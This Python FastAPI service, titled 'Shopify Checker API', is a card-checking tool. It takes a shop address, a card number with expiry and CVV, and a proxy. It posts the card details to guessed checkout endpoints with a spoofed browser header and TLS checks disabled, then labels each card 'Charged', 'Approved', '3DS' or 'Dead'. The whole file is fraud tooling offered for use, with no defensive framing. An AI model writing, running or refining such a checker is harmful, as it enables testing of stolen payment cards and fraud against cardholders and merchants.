import os
import json
import asyncio
import re
from typing import Optional, Dict, Any
from urllib.parse import urljoin

import aiohttp
from fastapi import FastAPI, HTTPException, Query
from pydantic import BaseModel
import uvicorn

# =============== CONFIG ===============
PORT = int(os.getenv("PORT", 8000))
TIMEOUT = 30          # seconds
MAX_RETRIES = 2

# =============== PYDANTIC MODELS ===============
class CheckRequest(BaseModel):
    site: str          # e.g., "example.myshopify.com" or "https://example.com"
    cc: str            # "4111111111111111|12|2026|123"
    proxy: Optional[str] = None

class CheckResponse(BaseModel):
    status: str        # "Charged", "Approved", "3DS", "Dead", "Error"
    message: str
    price: str
    gateway: str = "Shopify"

# =============== HELPERS ===============
def parse_proxy(proxy_str: Optional[str]) -> Optional[Dict[str, str]]:
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return {'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'}
    elif len(parts) == 2:
        return {'http': f'http://{parts[0]}:{parts[1]}',
                'https': f'http://{parts[0]}:{parts[1]}'}
    return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}

def extract_price(text: str) -> str:
    """Extract a price from a string (e.g., '$10.00' -> '10.00')"""
    match = re.search(r'[\d.]+', text.replace(',', ''))
    return match.group() if match else '0.00'

def classify_response(response_text: str, price_str: str) -> CheckResponse:
    """Classify Shopify response into statuses."""
    lower = response_text.lower()
    if any(k in lower for k in ['charged', 'order placed', 'thank you', 'payment successful']):
        return CheckResponse(status="Charged", message=response_text, price=price_str)
    elif any(k in lower for k in ['approved', 'insufficient_funds', 'invalid_cvv', 'cvv']):
        return CheckResponse(status="Approved", message=response_text, price=price_str)
    elif any(k in lower for k in ['3d', '3d secure', 'otp', 'verification required', 'authenticate']):
        return CheckResponse(status="3DS", message=response_text, price=price_str)
    elif any(k in lower for k in ['declined', 'generic_error', 'decision_rule_block']):
        return CheckResponse(status="Dead", message=response_text, price=price_str)
    else:
        return CheckResponse(status="Dead", message=response_text, price=price_str)

# =============== SHOPIFY CHECKOUT LOGIC ===============
async def attempt_checkout(session: aiohttp.ClientSession, site: str, card_parts: list, proxy: Optional[Dict]) -> CheckResponse:
    """
    Attempt to perform a Shopify checkout.
    This is a generic attempt – Shopify sites vary, so we try multiple endpoints.
    """
    card, month, year, cvv = card_parts
    # Normalize site URL
    if not site.startswith('http'):
        site = 'https://' + site
    base_url = site.rstrip('/')

    # Common checkout endpoints
    endpoints = [
        '/checkout',
        '/cart/update',
        '/cart',
        '/api/checkout',
        '/payment',
        '/pay',
        '/checkout/payment',
        '/cart/checkout',
        '/checkout.json',
    ]

    # Build a generic payload – some sites expect form data, others JSON.
    # We'll try JSON first, then form-encoded.
    payload_json = {
        "card_number": card,
        "expiry_month": month,
        "expiry_year": year,
        "cvv": cvv,
        "payment_method": "credit_card"
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': base_url,
        'Referer': base_url + '/',
    }

    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        try:
            async with session.post(url, json=payload_json, headers=headers, proxy=proxy, ssl=False) as resp:
                text = await resp.text()
                # Try to parse JSON
                try:
                    data = json.loads(text)
                    msg = data.get('message', data.get('response', text))
                    price = str(data.get('price', data.get('amount', '0.00')))
                except:
                    msg = text[:200]
                    price = '0.00'
                # If response contains "order" or "success", likely Charged
                return classify_response(msg, price)
        except Exception:
            continue

    # If all endpoints fail, try a generic POST to the base URL with form data
    try:
        form_data = {
            'card[number]': card,
            'card[expiry_month]': month,
            'card[expiry_year]': year,
            'card[cvv]': cvv,
        }
        async with session.post(base_url + '/checkout', data=form_data, headers={'User-Agent': headers['User-Agent']}, proxy=proxy, ssl=False) as resp:
            text = await resp.text()
            return classify_response(text[:200], '0.00')
    except Exception:
        pass

    return CheckResponse(status="Error", message="No checkout endpoint responded", price="0.00")

async def check_card(req: CheckRequest) -> CheckResponse:
    """
    Main check function.
    """
    card_parts = req.cc.split('|')
    if len(card_parts) != 4:
        return CheckResponse(status="Error", message="Invalid card format (expect card|mm|yy|cvv)", price="0.00")
    
    proxy = parse_proxy(req.proxy)
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for attempt in range(MAX_RETRIES + 1):
            try:
                result = await attempt_checkout(session, req.site, card_parts, proxy)
                return result
            except asyncio.TimeoutError:
                if attempt == MAX_RETRIES:
                    return CheckResponse(status="Error", message="Timeout after retries", price="0.00")
                await asyncio.sleep(1)
            except Exception as e:
                if attempt == MAX_RETRIES:
                    return CheckResponse(status="Error", message=str(e), price="0.00")
                await asyncio.sleep(1)
    return CheckResponse(status="Error", message="All attempts failed", price="0.00")

# =============== FASTAPI APP ===============
app = FastAPI(title="Shopify Checker API", version="1.0")

@app.get("/shopify/check", response_model=CheckResponse)
async def shopify_check(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: Optional[str] = Query(None)
):
    req = CheckRequest(site=site, cc=cc, proxy=proxy)
    try:
        result = await check_card(req)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Support POST as well (for flexibility)
@app.post("/shopify/check", response_model=CheckResponse)
async def shopify_check_post(req: CheckRequest):
    try:
        result = await check_card(req)
        return result
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/health")
async def health():
    return {"status": "ok"}

# =============== RUN ===============
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=PORT)
